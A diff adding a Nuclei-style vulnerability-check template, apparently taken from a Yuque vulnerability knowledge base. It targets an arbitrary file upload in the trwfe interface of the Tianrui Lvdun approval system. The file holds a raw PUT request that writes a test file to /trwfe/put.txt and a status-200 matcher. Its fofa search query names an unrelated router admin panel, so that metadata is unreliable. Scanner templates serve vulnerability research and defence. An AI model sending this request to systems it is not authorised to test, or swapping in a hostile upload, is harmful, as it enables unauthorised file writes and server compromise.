@@ -1,0 +1,53 @@
+id: poc-nv7zl9mumngptu0g
+info:
+  name: 天锐绿盾审批系统trwfe接口任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nv7zl9mumngptu0g'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nv7zl9mumngptu0g
+    fofa: title = ZSRV2路由器Web管理系统
+http:
+- raw:
+  - 'PUT /trwfe/put.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Priority: u=0, i
+
+    Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: same-origin
+
+    Upgrade-Insecure-Requests: 1
+
+
+    123123
+
+
+    上传定位：/trwfe/put.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
